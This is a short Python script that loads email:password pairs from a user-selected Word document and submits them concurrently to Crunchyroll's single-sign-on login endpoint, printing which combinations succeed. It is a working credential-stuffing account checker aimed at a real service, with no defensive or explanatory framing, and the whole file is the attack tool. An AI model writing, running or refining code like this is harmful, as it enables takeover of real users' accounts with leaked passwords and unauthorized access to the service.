import docx
import requests
from concurrent.futures import ThreadPoolExecutor
import tkinter as tk
from tkinter import filedialog

# Prompt the user to select the .docx file to use
root = tk.Tk()
root.withdraw()
filename = filedialog.askopenfilename(title='Select .docx file', filetypes=[('Word Documents', '*.docx')])

# Load the document
document = docx.Document(filename)

# Define a function to make the login request and return the result
def try_login(email, password):
    # Construct the payload for the login request
    payload = {
        'username': email,
        'password': password,
    }

    # Make the login request
    response = requests.post('https://sso.crunchyroll.com/login?authid=thU0IsclWRRCApaGMzEcEt6vXplkcawaARnv6H-Z', data=payload)

    # Return the result
    return email, response

# Create a thread pool to make the login requests
with ThreadPoolExecutor() as executor:
    # Loop through each paragraph in the document and submit a login request for each email/password pair
    futures = []
    for paragraph in document.paragraphs:
        # Skip any empty lines
        if not paragraph.text:
            continue

        # Split the text by the colon to get the email and password
        email, password = paragraph.text.split(':', maxsplit=1)

        # Submit a login request for the current email/password pair
        futures.append(executor.submit(try_login, email, password))

    # Wait for all the login requests to complete
    for future in futures:
        email, response = future.result()

        # Check if the login was successful
        if response.status_code == 200 and 'Welcome' in response.text:
            print(f"Login successful for {email}")
            break
        else:
            print(f"Login failed for {email}")
